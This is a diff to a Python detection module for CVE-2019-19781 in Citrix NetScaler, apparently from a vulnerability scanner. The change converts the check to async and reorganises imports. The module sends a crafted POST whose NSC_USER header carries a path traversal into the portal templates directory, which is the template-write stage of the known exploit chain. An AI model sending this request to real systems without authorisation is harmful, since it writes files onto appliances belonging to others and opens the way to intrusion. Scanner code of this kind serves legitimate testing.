@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import uuid
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2019_19781_BaseVerify:
     def __init__(self, url):
@@ -19,7 +19,7 @@ class CVE_2019_19781_BaseVerify:
         self.cdl = str(uuid.uuid4()).split('-')[0]
         self.payload = ''
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -37,15 +37,12 @@ class CVE_2019_19781_BaseVerify:
                 'NSC_USER': '../../../netscaler/portal/templates/%s' %self.cdl,
                 'NSC_NONCE': 'nsroot'
             }
-            req = request.post(url = newbm_url, headers = headers, data = self.payload)
-            if req.status_code == 200 and 'parent.window.ns_reload' in req.content:
+            req = await request.post(url = newbm_url, headers = headers, data = self.payload)
+            if req.status == 200 and 'parent.window.ns_reload' in req.content:
                 return True
-            else:
-                return False
+            
         except Exception as e:
             # print(e)
-            return False
-        finally:
             pass
 
 if __name__ == '__main__':
